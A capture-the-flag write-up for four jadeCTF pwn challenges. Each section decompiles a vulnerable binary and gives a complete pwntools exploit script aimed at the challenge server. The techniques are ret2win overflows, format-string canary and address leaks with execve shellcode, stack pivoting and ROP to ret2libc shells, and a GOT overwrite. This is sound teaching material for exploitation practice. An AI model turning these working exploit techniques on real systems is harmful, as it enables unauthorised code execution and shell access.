# Baby Pwn
We are given a binary.  
First, run checksec on it:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

On analyzing it with Ghidra, we find the `start_program()` function:
```c
void start_program(void)

{
  char local_208 [512];
  
  puts("Enter your name:");
  gets(local_208);
  printf("Hello %s, welcome to jadeCTF!\n",local_208);
  return;
}
```
This is a simple Buffer Overflow. There is also a `win()` function which we need to call:
```c
void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Nice job :)");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Sorry, flag doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  printf("Here is your flag: %s\n",local_78);
  return;
}
```
We can overflow the `local_208` variable and call the `win()` function to get the flag.  
**solve.py**
```py
from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary

# p = elf.process()
p = remote("34.76.206.46", 10002)

OFFSET = 0x200 + 8

payload = cyclic(OFFSET)
payload += p64(elf.symbols["win"])

p.sendlineafter(b"Enter your name:\n", payload)
p.interactive()
```
FLAG: `jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}`

# Data Storage
First run checksec on the binary:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

Analyzing the binary in Ghidra. This is the main function:
```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  puts("This is a data storing system.");
  puts("It stores your name, address and other details");
  gen_ints();
  database_store();
  puts("Thank you for using our storage facility!");
  return 0;
}
```
We can see that it first calls the `gen_ints()` function. Let's see that:
```c
void gen_ints(void)

{
  int iVar1;
  time_t tVar2;
  time_t local_10;
  
  tVar2 = time(&local_10);
  srand((uint)tVar2);
  iVar1 = rand();
  n = iVar1 % 0x32 + 1;
  iVar1 = rand();
  an = iVar1 % 0x19 + 1;
  iVar1 = rand();
  b = iVar1 % 0x32 + 1;
  iVar1 = rand();
  u = iVar1 % 0x32 + 1;
  a = 0x200 - (u + n + an + b);
  return;
}
```
It basically generates 4 random numbers, stores them in `n`, `an`, `b` and `u`. Then subtracts the sum of these from 0x200 and stores it in `a`.
Next, we have the `database_store()` function:
```c
void database_store(void)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  size_t sVar4;
  long in_FS_OFFSET;
  char local_238 [16];
  char local_228 [16];
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Are you sure that you want to store data [yes/no]?");
  fgets(local_238,10,stdin);
  sVar4 = strcspn(local_238,"\r\n");
  local_238[sVar4] = '\0';
  printf("You entered: ");
  printf(local_238);
  puts("\nIs that correct?");
  fgets(local_228,10,stdin);
  sVar4 = strcspn(local_228,"\r\n");
  local_228[sVar4] = '\0';
  iVar1 = strcmp(local_228,"yes");
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Now, it\'s time to enter your details");
  puts(
      "Note that there is a length given for each field, you have to enter atleast that many charact ers"
      );
  puts("Fill it up with spaces if your input is less");
  printf("Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (i n this order):\n"
         ,(ulong)n,(ulong)an,(ulong)b,(ulong)u,(ulong)a);
  gets(local_218);
  puts("Scrambling your data so that hackers can\'t steal it...");
  modify(name,local_218,0);
  uVar2 = n;
  modify(admno,local_218,n);
  iVar1 = uVar2 + an;
  modify(branch,local_218,iVar1);
  iVar1 = iVar1 + b;
  modify(university,local_218,iVar1);
  modify(address,local_218,iVar1 + u);
  memset(local_218,0,0x200);
  modify(local_218,name,0);
  iVar1 = (int)n / 2;
  modify(local_218 + iVar1,branch,0);
  iVar1 = iVar1 + (int)b / 3;
  modify(local_218 + iVar1,admno,0);
  iVar1 = iVar1 + (int)an / 3;
  modify(local_218 + iVar1,university,0);
  iVar1 = iVar1 + (int)u / 2;
  modify(local_218 + iVar1,address,0);
  iVar1 = iVar1 + (int)a / 10;
  modify(local_218 + iVar1,branch,(int)b / 3);
  iVar1 = iVar1 + (b - (int)b / 3);
  modify(local_218 + iVar1,name,(int)n / 2);
  iVar1 = iVar1 + (n - (int)n / 2);
  modify(local_218 + iVar1,address,(int)a / 10);
  iVar1 = iVar1 + (int)a / 10;
  modify(local_218 + iVar1,university,(int)u / 2);
  uVar2 = u;
  if ((int)u < 0) {
    uVar2 = u + 3;
  }
  iVar1 = iVar1 + ((int)uVar2 >> 2);
  modify(local_218 + iVar1,admno,(int)an / 3);
  iVar1 = iVar1 + (an - (int)an / 3);
  modify(local_218 + iVar1,address,(int)a / 10 + (int)a / 10);
  uVar2 = u;
  if ((int)u < 0) {
    uVar2 = u + 3;
  }
  uVar3 = u;
  if ((int)u < 0) {
    uVar3 = u + 3;
  }
  modify(local_218 + (int)(iVar1 + a + (-((int)a / 10) - (int)a / 10)),university,
         ((int)uVar3 >> 2) + (int)u / 2,u - (((int)uVar2 >> 2) + (int)u / 2));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
This is a big code. First it is taking some inputs, and then we can see that we have a format strings vulnerability in a printf statement. Moving on, it takes an input (we have buffer overflow here as gets is being used). Then it calls the `modify()` function on our input.
```c
undefined * modify(undefined *param_1,long param_2,int param_3,int param_4)

{
  int local_20;
  long local_18;
  undefined *local_10;
  
  local_18 = param_2;
  local_10 = param_1;
  for (local_20 = param_4; 0 < local_20; local_20 = local_20 + -1) {
    *local_10 = *(undefined *)(local_18 + param_3);
    local_10 = local_10 + 1;
    local_18 = local_18 + 1;
  }
  *local_10 = 0;
  return local_10;
}
```
On seeing this function carefully we find that this is basically slicing the string (i.e., finding a substring). So, with that in mind, let's continue our analysis.  
The code performs some substring operations and then stores each part in different variables, and then slices these variables at some positions and stores it back in our original buffer.
So, our exploit would be like this:
1. First, leak the address of the buffer and the canary using the format strings.
2. Craft a shellcode which runs /bin/sh.
3. Enter the shellcode in the buffer, and then overflow it. Enter the canary at the appropriate place, then ret to our shellcode.
4. Reverse the scrambling part and "de-scramble" this payload, so that when the binary scrambles it, it becomes the original payload.  
**solve.py**
```py
from pwn import *
import re
from time import sleep
import subprocess as sb

BINARY = "chall"
context.binary = BINARY
ELF = context.binary

# p = ELF.process()
p = remote("34.76.206.46", 10003)

def scramble(x):
    ptr = 0
    name = x[ptr:ptr+n]
    ptr += n
    admno = x[ptr:ptr+an]
    ptr += an
    branch = x[ptr:ptr+b]
    ptr += b
    university = x[ptr:ptr+u]
    ptr += u
    address = x[ptr:ptr+a]
    ptr += a
    
    new_x = name[:n//2] + branch[:b//3] + admno[:an//3] + university[:u//2] + address[:a//10] + branch[b//3:] + name[n//2:] + address[a//10:a//10 + a//10] + university[u//2:u//2+u//4] + admno[an//3:] + address[a//10+a//10:] + university[u//2+u//4:] + x[ptr:]
    return new_x

def fix_payload(n, an, b, u, a, payload):
    s = n+an+b+u+a
    x = []
    for i in range(s):
        x.append(i)
    x = scramble(x)
    new_payload = [0]*len(payload)
    for i in range(len(x)):
        new_payload[x[i]] = payload[i]
    new_payload[s:] = payload[s:]
    return new_payload

payload = b"%7$p%77$p"
p.recvuntil(b"[yes/no]?\n")
p.send(payload)

recvd = p.recvline().strip().decode()
BUFFER = int("0x" + recvd.split("0x")[1], 16)
CANARY = int("0x" + recvd.split("0x")[-1], 16)

log.info(f"canary -> {hex(CANARY)}")
log.info(f"buffer -> {hex(BUFFER)}")

p.sendlineafter(b"correct?\n", b"yes")
p.recvuntil(b"input is less\n")
n, an, b, u, a = [int(x) for x in re.findall("\d+", p.recvline().decode())]
s = n+an+b+u+a

sb.run("./shellcode_compile.sh shellcode.s", shell=True)
shellcode = open("shellcode.bin","rb").read().strip()
sb.run("rm -rf ./shellcode.bin", shell=True)
# shellcode = asm(shellcraft.execve(path="/bin/sh"))
payload = b"\x90"*50 + shellcode
payload += b"\x00"*(520-len(payload))
payload += p64(CANARY)
payload += b"a"*8
payload += p64(BUFFER)

payload = fix_payload(n, an, b, u, a, payload)
payload = bytearray(payload)
p.sendline(payload)

p.interactive()
```
**shellcode.s**
```s
.global _start
_start:
.intel_syntax noprefix
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rip+binsh]
    mov rax, 59
    syscall
    binsh:
        .string "/bin/sh"
```
**shellcode_compile.sh**
```bash
#!/bin/bash
gcc -nostdlib -static "$1" -o shellcode
objcopy --dump-section .text=shellcode.bin shellcode
rm shellcode
```

FLAG: `jadeCTF{sh3llc0ding_but_w1th_4_tw1st}`

# Guess Game
First let's run checksec on the binary:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
Now, let's start analyzing the binary on Ghidra. First, we have the `main()` function:
```c
undefined8 main(void)
{
  uint local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  fill_secret_buffer();
  write(2,"Welcome to my game, choose any number between 1-10\n",0x33);
  write(2,"Enter a number: ",0x10);
  __isoc99_scanf(&DAT_00400f6d,&local_c);
  getchar();
  if (((int)local_c < 0xb) && (0 < (int)local_c)) {
    if ((local_c & 1) == 0) {
      even_option();
    }
    else {
      odd_option();
    }
    write(2,"Bye bye\n",8);
    return 0;
  }
  write(2,"Wrong number entered\n",0x15);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
It calls the `fill_secret_buffer()` function first.
```c
void fill_secret_buffer(void)
{
  FILE *__stream;
  
  __stream = fopen("secret.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Sorry, secret doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(secret_buffer,100,__stream);
  return;
}
```
It just reads a file `secret.txt` and stores its contents in a variable `secret_buffer`. Going back to main, it takes a number as input, then if it's even, calls the `even_option()` function, and if its odd, calls the `odd_option()` function. First, let's see `even_option()`:
```c
void even_option(void)
{
  size_t sVar1;
  char local_78 [108];
  int local_c;
  
  write(2,"Enter your name: ",0x11);
  fgets(local_78,100,stdin);
  sVar1 = strcspn(local_78,"\r\n");
  local_78[sVar1] = '\0';
  local_c = sprintf(temp_buffer,
                    "Hello %s, we are sorry but you gave us the wrong input. Please try again.\n" ,
                    local_78);
  write(2,temp_buffer,(long)local_c);
  return;
}
```
It just takes an input and prints out a text. Nothing special here. Moving on to `odd_option()`:
```c
void odd_option(void)
{
  char *pcVar1;
  char local_148 [208];
  char local_78 [108];
  int local_c;
  
  write(2,"Let\'s begin, but first here is how you play:\n",0x2d);
  write(2,"- A number will be shown to you\n",0x20);
  write(2,"- You have to enter two strings\n",0x20);
  write(2,"- - The first should be your name\n",0x22);
  write(2,"- - The second string should be equal to the secret code\n",0x39);
  write(2,"- If you successfully guess the secret code, you win!\n",0x36);
  local_c = sprintf(temp_buffer,"\nHere\'s the number: %lld\n",local_148);
  write(2,temp_buffer,(long)local_c);
  write(2,"Enter first input please: ",0x1a);
  fgets(local_148,200,stdin);
  write(2,"Enter second input please: ",0x1b);
  fgets(local_78,0x82,stdin);
  pcVar1 = strcpy(local_78,secret_buffer);
  if (pcVar1 == (char *)0x0) {
    write(2,"Congrats! You win!\n",0x13);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```
This function first prints out some text, and then *leaks* the address of `local_148` (our first input buffer), then takes two inputs. It then checks if our second input is equal to the `secret_buffer` variable or not. If it is, then the program exits. Also we have an overflow in the second input, but it's not enough to create a full ROP chain.  
But we see that we have been provided another input buffer, so we can perform *stack pivoting*. Using that, we can build our ROP chain in the first buffer, and then execute it from there. Next, where should we jump to?  
On inspecting in Ghidra, we see this function:
```c
void hidden_level(int param_1)

{
  char local_78 [112];
  
  write(2,"Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n",0x4f );
  fgets(local_78,0x200,stdin);
  if (param_1 != -0x21524111) {
    write(2,"Did you cheat?\n",0xf);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```
And we have an overflow here! But, we have to make the `param_1` as -0x21524111. So, we have to use the `pop rdi; ret` gadget and place this value in rdi before calling the function. Next, now that this is done, we have an unrestricted buffer overflow here. Now, the problem here is that we don't have the `puts` function available to us. Instead, we have the `write` function, which takes 3 arguments. If we check the manual for `write`:
```c
ssize_t write(int fildes, const void *buf, size_t nbytes);
```
We need to provide all these 3 arguments. Hence, we need to fill the `rdi`, `rsi`, and `rdx` registers. Searching for gadgets, we have:
```s
0x0000000000400946 : pop rdi ; ret
0x0000000000400948 : mov rsi, qword ptr [rbp - 0x30] ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x000000000040094d : pop rdx ; ret
```  
  
**NOTE:** In our writeup, we have used the second gadget for rsi (0x400948) to show how even complex gadgets can be used for ROP chaining, but it will be easier to use the third gadget (0x400c81).
Using these gadgets, we can pass the appropriate values to the registers, and then call the write function to leak addresses and find the LIBC base, after which, we can perform a simple ret2libc and get a shell.  
  
Our Exploit:
1. Perform stack pivoting to call the `hidden_level()` function with appropriate arguments.
2. Use the `write` function to leak addresses of other functions (like `setvbuf`), and leak the LIBC base.
3. Perform ret2libc to get a shell.
  
**solve.py**
```py
from pwn import *

BINARY = "chall"
LIBC = "libc.so.6"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)
libc = ELF(LIBC)

# p = elf.process()
p = remote("34.76.206.46", 10004)

p.sendlineafter(b"Enter a number: ", b"3")

p.recvuntil(b"the number: ")
leak = int(p.recvline().strip())
log.info(f"buffer address -> {hex(leak)}")
log.info(f"hidden level -> {hex(elf.symbols['hidden_level'])}")
log.info(f"setvbuf got -> {hex(elf.got['setvbuf'])}")

payload = flat(
    p64(0),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(-0x21524111, sign="signed"),
    p64(elf.symbols["hidden_level"])
)
p.sendlineafter(b"first input please: ", payload)

payload = cyclic(0x70)
payload += p64(leak)
payload += p64(rop.find_gadget(["leave", "ret"]).address)

p.sendlineafter(b"second input please: ", payload)

log.info(f"address for write to print -> {hex(leak+0x140-0x70+0x30)}")

payload =  cyclic(88)
payload += p64(elf.got["setvbuf"])
payload += cyclic(0x70-len(payload))
payload += p64(leak+0x30)
payload += p64(0x400948)
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(2)
payload += p64(rop.find_gadget(["pop rdx", "ret"]).address)
payload += p64(8)
payload += p64(elf.plt["write"])
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(0xdeadbeef)
payload += p64(elf.symbols["hidden_level"])

p.sendlineafter(b"unlock the hidden door:\n", payload)

setvbuf_leak = p.recvuntil(b"Oooh!")[:-5]
setvbuf_leak = u64(setvbuf_leak.ljust(8, b'\x00'))

log.info(f"setvbuf leak -> {hex(setvbuf_leak)}")
libc_base = setvbuf_leak - libc.symbols["setvbuf"]
log.info(f"libc base -> {hex(libc_base)}")
libc.address = libc_base

payload =  cyclic(0x70+8)
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

p.sendlineafter(b"unlock the hidden door:\n", payload)

p.interactive()
p.close()
```  
  
FLAG: `jadeCTF{p1v0t!_p1v0t!_p1v0t!}`  
  
**NOTE:** There is another route possible in which you don't need to call the `hidden_level()` function. You can call the `odd_option()` function again and again and perform stack pivoting each time.

# Love Calculator
First, perform checksec on the binary:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
Now, let's analyze the binary in Ghidra. This is the main function:
```c
undefined8 main(void)
{
  size_t sVar1;
  char local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  puts("Welcome to *my* world! It sucks.");
  printf("Please enter your name: ");
  fgets(local_28,0x13,stdin);
  putchar(10);
  sVar1 = strcspn(local_28,"\r\n");
  local_28[sVar1] = '\0';
  analyze_name(local_28);
  puts("Bye Bye");
  return 0;
}
```
It inputs our name, and then calls `analyze_name()`. Let's see what that is:
```c
void analyze_name(undefined8 param_1)
{
  int local_7c;
  char local_78 [112];
  
  printf("Hello, %s! I heard you\'ve come here to analyze yourself.\n",param_1);
  puts("1. Cleanse yourself\n2. Calculate love percentage\n3. Exit");
  printf("Please choose what you would like to do: ");
  __isoc99_scanf(&DAT_00400dda,&local_7c);
  if (local_7c == 1) {
    puts("Cleansing....");
    puts("Cleanse successful. You are fully pure now!");
  }
  else {
    if (local_7c != 2) {
      puts("Sorry to see you go :-(");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Enter the name of the lucky one ;): ");
    getchar();
    gets(local_78);
    if (show_flag != 0) {
      puts("Sorry, but you have already got the flag");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (tried_luck != 0) {
      puts("Sorry, but you can only try your luck once :)");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    tried_luck = 1;
  }
  return;
}
```
Clearly, we have to input *2* here in order to reach the overflow on `local_78`. It's an unrestricted buffer overflow.  
There is a `win()` function which we can call:
```c
void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    printf("Sorry, fl%dg doesn\'t exist.\n",4);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  if (show_flag == 0) {
    printf("Sorry, no fl%dg for you!",4);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Here is your flag: %s\n",local_78);
  return;
}
```
But here, this function works only if the value of `show_flag` is not zero. But from Ghidra, we can see that it is a global variable with default value zero. So, first we need to change its value. Let's see if we have some other function to jump to.  
```c
void you_cant_see_me(void)
{
  char local_f8 [208];
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  undefined4 local_c;
  
  local_28 = 0xa65686548;
  local_20 = 0;
  local_18 = 0;
  local_c = 0;
  printf("Did you see m%d? ",3);
  printf("Wh%d are you?\n",0);
  read(0,local_f8,200);
  printf("Nice name it %ds: ",1);
  printf(local_f8);
  printf("But now you won\'t be able to s%d%d me!\n",3,3);
  puts((char *)&local_28);
  show_flag = local_c;
  return;
}
```
This function takes an input in `local_f8`, then has a *format strings* vulnerability in the same variable, and then assigns the value of `local_c` (0 by default) to `show_flag`. Now, suppose if we somehow change the value of `local_c` to 1 or something else using the format strings vulnerability, we still need an overflow somewhere to call the `win` function. 
One thing which we can do for this is, if we perform a *GOT overwrite* and change the `puts` function to make it `gets`, we will get an overflow right before the assignment statement. Using the overflow, we can even change the value of `local_c` as well as call the `win` function. So that's what we'll do.  
But first, we need the LIBC (since we will be performing GOT overwrite). So, for that, let's leak some LIBC addresses.  
Here's the script for leaking LIBC addresses:   

**leak_libc.py**
```py
from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)

p = remote("34.76.206.46", 10005)
# p = elf.process()

p.sendlineafter(b"your name: ", b"Ramesh")
p.sendlineafter(b"what you would like to do: ", b"2")

OFFSET = 120

payload = flat(
    cyclic(OFFSET),
    p64(rop.find_gadget(["ret"]).address),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(elf.got["setvbuf"]),
    p64(elf.plt["puts"]),
    p64(elf.symbols["you_cant_see_me"])
)

p.sendlineafter(b"lucky one ;): ", payload)

LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"leaked address -> {hex(LEAK)}")

p.close()
```
Leak addresses of some common functions like `puts`, `setvbuf`, etc. Then use the last 3 nibbles to search for libc on [blukat](https://libc.blukat.me/). We get two results, let's assume that the first one is the LIBC we need (If it doesn't work, then we'll use the second one). Now, let's formulate our exploit:

1. Leak address of some common functions to get the LIBC base, and ret to `you_cant_see_me()`.
2. Perform a GOT overwrire to change `puts` to `gets`.
3. Perform a simple buffer overflow to call the `win()` function, and also simultaneously change the value of `local_c` to something other than 0.  
  
**solve.py**
```py
from pwn import *

BINARY = "chall"
LIBC = "libc6_2.23-0ubuntu11.2_amd64.so"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)
libc = ELF(LIBC)

p = remote("34.76.206.46", 10005)
# p = elf.process()

p.sendlineafter(b"your name: ", b"Ramesh")
p.sendlineafter(b"what you would like to do: ", b"2")

# First, leak libc base and rebase libc
OFFSET = 120

payload = flat(
    cyclic(OFFSET),
    p64(rop.find_gadget(["ret"]).address),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(elf.got["puts"]),
    p64(elf.plt["puts"]),
    p64(elf.symbols["you_cant_see_me"])
)

p.sendlineafter(b"lucky one ;): ", payload)

LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"puts address -> {hex(LEAK)}")

LIBC_BASE =  LEAK - libc.symbols["puts"]
log.info(f"libc base -> {hex(LIBC_BASE)}")

libc.address = LIBC_BASE


# Now, GOT overwrite, change puts to gets
payload = fmtstr_payload(6, {elf.got['puts'] : libc.symbols["gets"]})
p.sendlineafter(b"are you?\n", payload)

payload = flat(
    cyclic(40),
    elf.symbols["win"]
)

p.sendlineafter(b"s33 me!\n", payload)

p.interactive()
p.close()
```
  
FLAG: `jadeCTF{ret2libc_can_b3_fun_a5_w3ll}`